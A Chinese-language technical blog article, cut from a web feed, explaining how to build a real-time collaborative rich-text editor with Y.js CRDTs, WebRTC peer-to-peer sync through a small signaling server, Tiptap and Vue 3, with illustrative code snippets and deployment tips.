  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:35:51.000Z" title="Wed Dec 10 2025 02:35:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在现代办公和学习场景中，多人实时协同编辑变得越来越重要。想象一下，团队成员可以同时编辑同一份文档，每个人的光标和输入都实时可见，就像坐在同一个会议室里一样。这种功能在 Google Docs、Notion 等应用中已经变得司空见惯。今天，我将带你深入剖析如何基于 Y.js、WebRTC 和 Tiptap 构建一个完整的实时协同编辑器。</p>
<h2 data-id="heading-1">技术架构概览</h2>
<p>我们的协同编辑系统主要由三部分组成：</p>
<ol>
<li><strong>前端编辑器 (TiptapEditor.vue)</strong> - 基于 Vue 3 和 Tiptap 的富文本编辑器</li>
<li><strong>协同框架 (Y.js)</strong> - 负责文档状态同步和冲突解决</li>
<li><strong>信令服务器 (signaling-server.js)</strong> - WebRTC 连接的中介服务</li>
</ol>

<pre><code class="hljs language-css" lang="css">用户<span class="hljs-selector-tag">A</span>浏览器 ↔ WebRTC ↔ 用户<span class="hljs-selector-tag">B</span>浏览器
      ↑                       ↑
     Y<span class="hljs-selector-class">.js</span> ←→ 协同状态 ←→ Y<span class="hljs-selector-class">.js</span>
      ↓                       ↓
   Tiptap编辑器           Tiptap编辑器
</code></pre>
<h2 data-id="heading-2">核心原理深度解析</h2>
<h3 data-id="heading-3">1. Y.js 的 CRDT 算法</h3>
<p>Y.js 之所以能实现无冲突的实时协同，是因为它采用了 <strong>CRDT（Conflict-Free Replicated Data Types，无冲突复制数据类型）</strong> 算法。</p>
<p><strong>传统方案的问题：</strong></p>
<ul>
<li>如果两个用户同时编辑同一位置，传统方案需要通过锁机制或最后写入者胜出的策略</li>
<li>这些方案要么影响用户体验，要么可能导致数据丢失</li>
</ul>
<p><strong>CRDT 的解决方案：</strong></p>
<ul>
<li>每个操作都有唯一的标识符（时间戳 + 客户端ID）</li>
<li>操作是 <strong>可交换、可结合、幂等</strong> 的</li>
<li>无论操作以什么顺序到达，最终状态都是一致的</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 示例：Y.js 如何解决冲突</span>
用户<span class="hljs-attr">A</span>: 在位置<span class="hljs-number">2</span>插入<span class="hljs-string">"X"</span> → 操作<span class="hljs-attr">ID</span>: [时间A, 客户端A]
用户<span class="hljs-attr">B</span>: 在位置<span class="hljs-number">2</span>插入<span class="hljs-string">"Y"</span> → 操作<span class="hljs-attr">ID</span>: [时间B, 客户端B]

<span class="hljs-comment">// 即使两个操作同时发生，最终文档会变成"YX"或"XY"</span>
<span class="hljs-comment">// 具体顺序由操作ID决定，但所有客户端都会得到相同的结果</span>
</code></pre>
<h3 data-id="heading-4">2. WebRTC 的 P2P 通信</h3>
<p>WebRTC（Web Real-Time Communication）允许浏览器之间直接通信，无需通过中心服务器转发数据。</p>
<p><strong>关键优势：</strong></p>
<ul>
<li><strong>低延迟</strong>：数据直接在浏览器间传输</li>
<li><strong>减轻服务器压力</strong>：服务器只负责建立连接（信令）</li>
<li><strong>去中心化</strong>：更健壮的系统架构</li>
</ul>
<p><strong>建立连接的三个步骤：</strong></p>
<ol>
<li><strong>信令交换</strong>：通过信令服务器交换SDP和ICE候选</li>
<li><strong>NAT穿透</strong>：使用STUN/TURN服务器建立直接连接</li>
<li><strong>数据传输</strong>：直接传输Y.js的更新数据</li>
</ol>
<h3 data-id="heading-5">3. 文档模型映射</h3>
<p>Tiptap（基于 ProseMirror）使用树状结构表示文档，而Y.js使用线性结构。这两者之间需要建立映射关系：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">ProseMirror</span>文档树:
<span class="hljs-variable language_">document</span>
├─ paragraph
│  ├─ text <span class="hljs-string">"Hello"</span>
│  └─ <span class="hljs-title function_">text</span>(bold) <span class="hljs-string">"World"</span>
└─ bullet_list
   └─ list_item
      └─ paragraph <span class="hljs-string">"Item 1"</span>

Y.<span class="hljs-property">js</span> <span class="hljs-variable constant_">XML</span> <span class="hljs-title class_">Fragment</span>:
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">document</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">paragraph</span>&gt;</span>Hello<span class="hljs-tag">&lt;<span class="hljs-name">bold</span>&gt;</span>World<span class="hljs-tag">&lt;/<span class="hljs-name">bold</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">paragraph</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">bullet_list</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">list_item</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">paragraph</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">paragraph</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">list_item</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">bullet_list</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">document</span>&gt;</span></span>
</code></pre>
<h2 data-id="heading-6">实现细节剖析</h2>
<h3 data-id="heading-7">1. 协同状态管理</h3>
<p>让我们看看如何在 Vue 组件中管理协同状态：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 用户信息管理</span>
<span class="hljs-keyword">const</span> userInfo = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">`用户<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">1000</span>)}</span>`</span>,
  <span class="hljs-attr">color</span>: <span class="hljs-title function_">getRandomColor</span>() <span class="hljs-comment">// 每个用户有独特的颜色</span>
})

<span class="hljs-comment">// 在线用户列表</span>
<span class="hljs-keyword">const</span> onlineUsers = ref&lt;any[]&gt;([])

<span class="hljs-comment">// 更新用户列表的函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateOnlineUsers</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (!provider.<span class="hljs-property">value</span> || !provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>) <span class="hljs-keyword">return</span>
  
  <span class="hljs-keyword">const</span> states = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">getStates</span>().<span class="hljs-title function_">entries</span>())
  <span class="hljs-keyword">const</span> <span class="hljs-attr">users</span>: any[] = []
  
  states.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[clientId, state]</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (state &amp;&amp; state.<span class="hljs-property">user</span>) {
      users.<span class="hljs-title function_">push</span>({
        clientId,
        ...state.<span class="hljs-property">user</span>,
        <span class="hljs-attr">isCurrentUser</span>: clientId === provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-property">clientID</span>
      })
    }
  })
  
  onlineUsers.<span class="hljs-property">value</span> = users
}
</code></pre>
<p><strong>Awareness 系统</strong>是Y.js的一个关键特性：</p>
<ul>
<li>跟踪每个用户的 <strong>状态</strong>（姓名、颜色、光标位置等）</li>
<li>实时广播状态变化</li>
<li>处理用户加入/离开事件</li>
</ul>
<h3 data-id="heading-8">2. 编辑器的双重模式</h3>
<p>我们的编辑器支持两种模式，需要平滑切换：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 单机模式初始化</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">reinitEditorWithoutCollaboration</span> = (<span class="hljs-params"/>) =&gt; {
  editor.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Editor</span>({
    <span class="hljs-attr">extensions</span>: [<span class="hljs-title class_">StarterKit</span>, <span class="hljs-title class_">Bold</span>, <span class="hljs-title class_">Italic</span>, <span class="hljs-title class_">Heading</span>, ...],
    <span class="hljs-attr">content</span>: <span class="hljs-string">'&lt;h1&gt;欢迎使用编辑器&lt;/h1&gt;...'</span> <span class="hljs-comment">// 静态内容</span>
  })
}

<span class="hljs-comment">// 协同模式初始化</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">reinitEditorWithCollaboration</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 关键：协同模式下不设置初始内容</span>
  editor.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Editor</span>({
    <span class="hljs-attr">extensions</span>: [
      <span class="hljs-title class_">Collaboration</span>.<span class="hljs-title function_">configure</span>({ <span class="hljs-comment">// 协同扩展必须放在最前面</span>
        <span class="hljs-attr">document</span>: ydoc.<span class="hljs-property">value</span>,
        <span class="hljs-attr">field</span>: <span class="hljs-string">'prosemirror'</span>,
      }),
      <span class="hljs-title class_">StarterKit</span>.<span class="hljs-title function_">configure</span>({ <span class="hljs-attr">history</span>: <span class="hljs-literal">false</span> }), <span class="hljs-comment">// 禁用内置历史</span>
      <span class="hljs-title class_">Bold</span>, <span class="hljs-title class_">Italic</span>, <span class="hljs-title class_">Heading</span>, ...
    ],
    <span class="hljs-comment">// 不设置 content，由Y.js提供</span>
  })
}
</code></pre>
<p><strong>关键区别：</strong></p>
<ul>
<li>协同模式使用 <code>Collaboration</code> 扩展，禁用 <code>history</code></li>
<li>内容从 <code>Y.Doc</code> 加载，而不是静态设置</li>
<li>所有操作通过Y.js同步</li>
</ul>
<h3 data-id="heading-9">3. WebRTC 连接的生命周期</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">initCollaboration</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 1. 创建Y.js文档</span>
  ydoc.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> Y.<span class="hljs-title class_">Doc</span>()
  
  <span class="hljs-comment">// 2. 创建WebRTC提供者</span>
  provider.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebrtcProvider</span>(roomId.<span class="hljs-property">value</span>, ydoc.<span class="hljs-property">value</span>, {
    <span class="hljs-attr">signaling</span>: [<span class="hljs-string">'ws://localhost:1234'</span>], <span class="hljs-comment">// 信令服务器地址</span>
    <span class="hljs-attr">password</span>: <span class="hljs-literal">null</span>,
  })
  
  <span class="hljs-comment">// 3. 设置用户awareness</span>
  provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">setLocalStateField</span>(<span class="hljs-string">'user'</span>, userInfo.<span class="hljs-property">value</span>)
  
  <span class="hljs-comment">// 4. 监听连接状态</span>
  provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'status'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    isConnected.<span class="hljs-property">value</span> = event.<span class="hljs-property">status</span> === <span class="hljs-string">'connected'</span>
  })
  
  <span class="hljs-comment">// 5. 监听同步完成</span>
  provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">'synced'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'文档同步完成:'</span>, event.<span class="hljs-property">synced</span>)
  })
}
</code></pre>
<h3 data-id="heading-10">4. 信令服务器的实现</h3>
<p>信令服务器虽然简单，但至关重要：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 房间管理</span>
<span class="hljs-keyword">const</span> rooms = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>() <span class="hljs-comment">// roomId -&gt; Set of WebSocket connections</span>

wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">'connection'</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> {
  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">'message'</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(message.<span class="hljs-title function_">toString</span>())
    
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">'subscribe'</span>) {
      <span class="hljs-comment">// 客户端加入房间</span>
      <span class="hljs-keyword">const</span> topic = data.<span class="hljs-property">topic</span>
      <span class="hljs-keyword">if</span> (!rooms.<span class="hljs-title function_">has</span>(topic)) rooms.<span class="hljs-title function_">set</span>(topic, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>())
      rooms.<span class="hljs-title function_">get</span>(topic).<span class="hljs-title function_">add</span>(ws)
    }
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">'publish'</span>) {
      <span class="hljs-comment">// 转发消息给房间内其他客户端</span>
      <span class="hljs-keyword">const</span> roomClients = rooms.<span class="hljs-title function_">get</span>(data.<span class="hljs-property">topic</span>)
      roomClients.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">client</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (client !== ws) { <span class="hljs-comment">// 不转发给自己</span>
          client.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data))
        }
      })
    }
  })
})
</code></pre>
<p><strong>信令服务器的作用：</strong></p>
<ol>
<li><strong>房间管理</strong>：维护哪些客户端在哪个房间</li>
<li><strong>消息转发</strong>：将SDP和ICE候选转发给对等方</li>
<li><strong>连接建立</strong>：帮助WebRTC建立P2P连接</li>
</ol>
<h2 data-id="heading-11">实时协同的工作流程</h2>
<p>让我们通过一个具体场景来看系统如何工作：</p>
<h3 data-id="heading-12">场景：用户A和用户B协同编辑</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. 用户<span class="hljs-selector-tag">A</span>打开编辑器
   ├─ 初始化Y<span class="hljs-selector-class">.js</span>文档
   ├─ 创建WebRTC提供者
   ├─ 连接信令服务器
   └─ 加入房间"room-abc123"

<span class="hljs-number">2</span>. 用户<span class="hljs-selector-tag">B</span>通过链接加入同一房间
   ├─ 初始化Y<span class="hljs-selector-class">.js</span>文档（相同roomId）
   ├─ WebRTC通过信令服务器发现用户<span class="hljs-selector-tag">A</span>
   └─ 建立直接P2P连接

<span class="hljs-number">3</span>. 用户<span class="hljs-selector-tag">A</span>输入文字"Hello"
   ├─ Tiptap生成ProseMirror事务
   ├─ Collaboration扩展转换为Y<span class="hljs-selector-class">.js</span>操作
   ├─ Y<span class="hljs-selector-class">.js</span>操作通过WebRTC发送给用户<span class="hljs-selector-tag">B</span>
   └─ 用户<span class="hljs-selector-tag">B</span>的Y<span class="hljs-selector-class">.js</span>应用操作，更新Tiptap

<span class="hljs-number">4</span>. 用户<span class="hljs-selector-tag">B</span>同时输入"World"
   ├─ 同样流程反向进行
   ├─ Y<span class="hljs-selector-class">.js</span>的CRDT确保顺序一致性
   └─ 最终双方都看到"HelloWorld"
</code></pre>
<h2 data-id="heading-13">视觉反馈的实现</h2>
<p>为了让用户感知到其他协作者的存在：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 其他用户的光标样式 */</span>
<span class="hljs-selector-class">.ProseMirror-y-cursor</span> {
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">2px</span> solid; <span class="hljs-comment">/* 使用用户颜色 */</span>
}

<span class="hljs-selector-class">.ProseMirror-y-cursor</span> &gt; <span class="hljs-selector-tag">div</span> {
  <span class="hljs-comment">/* 显示用户名的标签 */</span>
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--user-color);
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">2px</span> <span class="hljs-number">6px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">3px</span>;
}
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 用户状态显示</span>
&lt;div v-<span class="hljs-keyword">for</span>=<span class="hljs-string">"user in onlineUsers"</span> :key=<span class="hljs-string">"user.clientId"</span> 
     <span class="hljs-keyword">class</span>=<span class="hljs-string">"user-tag"</span>
     :style=<span class="hljs-string">"{
       backgroundColor: user.color + '20',
       borderColor: user.color,
       color: user.color
     }"</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-avatar"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ backgroundColor: user.color }"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  {{ user.<span class="hljs-property">name</span> }}
&lt;/div&gt;
</code></pre>
<h2 data-id="heading-14">性能优化与注意事项</h2>
<h3 data-id="heading-15">1. 延迟优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 批量更新，减少网络传输</span>
provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">setLocalState</span>({
  <span class="hljs-attr">user</span>: userInfo.<span class="hljs-property">value</span>,
  <span class="hljs-attr">cursor</span>: editor.<span class="hljs-property">value</span>.<span class="hljs-property">state</span>.<span class="hljs-property">selection</span>.<span class="hljs-property">from</span>,
  <span class="hljs-comment">// 其他状态...</span>
})

<span class="hljs-comment">// 节流频繁更新</span>
<span class="hljs-keyword">let</span> updateTimeout
<span class="hljs-keyword">const</span> <span class="hljs-title function_">throttledUpdate</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-built_in">clearTimeout</span>(updateTimeout)
  updateTimeout = <span class="hljs-built_in">setTimeout</span>(updateOnlineUsers, <span class="hljs-number">100</span>)
}
</code></pre>
<h3 data-id="heading-16">2. 错误处理与降级</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span> {
  <span class="hljs-comment">// 尝试WebRTC连接</span>
  provider.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebrtcProvider</span>(roomId.<span class="hljs-property">value</span>, ydoc.<span class="hljs-property">value</span>, config)
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'WebRTC连接失败，降级到模拟模式:'</span>, error)
  
  <span class="hljs-comment">// 降级策略：模拟协同，实际为单机</span>
  isConnected.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  onlineUsers.<span class="hljs-property">value</span> = [{
    <span class="hljs-attr">clientId</span>: <span class="hljs-number">1</span>,
    ...userInfo.<span class="hljs-property">value</span>,
    <span class="hljs-attr">isCurrentUser</span>: <span class="hljs-literal">true</span>
  }]
  
  <span class="hljs-comment">// 提示用户</span>
  <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'协同模式不可用，已切换到单机模式'</span>)
}
</code></pre>
<h3 data-id="heading-17">3. 内存管理</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 组件卸载时清理</span>
<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (editor.<span class="hljs-property">value</span>) editor.<span class="hljs-property">value</span>.<span class="hljs-title function_">destroy</span>()
  <span class="hljs-keyword">if</span> (provider.<span class="hljs-property">value</span>) {
    provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">disconnect</span>()
    provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">destroy</span>()
  }
  <span class="hljs-keyword">if</span> (ydoc.<span class="hljs-property">value</span>) ydoc.<span class="hljs-property">value</span>.<span class="hljs-title function_">destroy</span>()
})
</code></pre>
<h2 data-id="heading-18">最终效果</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7bc7d1cb45a4a34ab1b6b5e005bb34c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5Yac56qB5Zu0Tk8x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938951&amp;x-signature=ABgIl6Mc%2FywPtKBNX98bVea3pW0%3D" alt="在这里插入图片描述" loading="lazy"/>
两个用户同时编辑，各在互不影响
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7642c63b8390406f90e95df0116ee41e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5Yac56qB5Zu0Tk8x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938951&amp;x-signature=ENSn2AT1xxvU5mzsvjhULqUPAmg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-19">部署与扩展</h2>
<h3 data-id="heading-20">1. 生产环境部署</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 生产环境信令服务器配置</span>
<span class="hljs-keyword">const</span> provider = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebrtcProvider</span>(roomId, ydoc, {
  <span class="hljs-attr">signaling</span>: [
    <span class="hljs-string">'wss://signaling1.yourdomain.com'</span>,
    <span class="hljs-string">'wss://signaling2.yourdomain.com'</span> <span class="hljs-comment">// 多节点冗余</span>
  ],
  <span class="hljs-attr">password</span>: <span class="hljs-string">'secure-room-password'</span>, <span class="hljs-comment">// 房间密码保护</span>
  <span class="hljs-attr">maxConns</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// 限制最大连接数</span>
})
</code></pre>
<h3 data-id="heading-21">2. 扩展功能</h3>
<ul>
<li><strong>离线支持</strong>：使用 IndexedDB 存储本地副本</li>
<li><strong>版本历史</strong>：利用 Y.js 的快照功能</li>
<li><strong>权限控制</strong>：不同用户的不同编辑权限</li>
<li><strong>插件系统</strong>：扩展编辑器功能</li>
</ul>
<h2 data-id="heading-22">总结</h2>
<p>构建实时协同编辑器是一个复杂的系统工程，涉及多个技术栈：</p>
<ol>
<li><strong>Y.js</strong> 提供了理论基础（CRDT算法）和核心同步能力</li>
<li><strong>WebRTC</strong> 实现了高效的P2P数据传输</li>
<li><strong>Tiptap</strong> 提供了优秀的编辑器体验和扩展性</li>
<li><strong>Vue 3</strong> 构建了响应式的用户界面</li>
</ol>
<p>这个项目的关键成功因素在于各个组件之间的无缝集成。Y.js处理数据一致性，WebRTC处理网络通信，Tiptap处理用户交互，而Vue将它们有机地组合在一起。</p>
<blockquote>
<p>完整代码联系作者获取！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[canvas的研究]]></title>    <link>https://juejin.cn/post/7581738974425006099</link>    <guid>https://juejin.cn/post/7581738974425006099</guid>    <pubDate>2025-12-10T02:45:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581738974425006099" data-draft-id="7581751726505115691" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="canvas的研究"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T02:45:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逍遥江湖"/> <meta itemprop="url" content="https://juejin.cn/user/3940246036941134"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            canvas的研究
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3940246036941134/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逍遥江湖
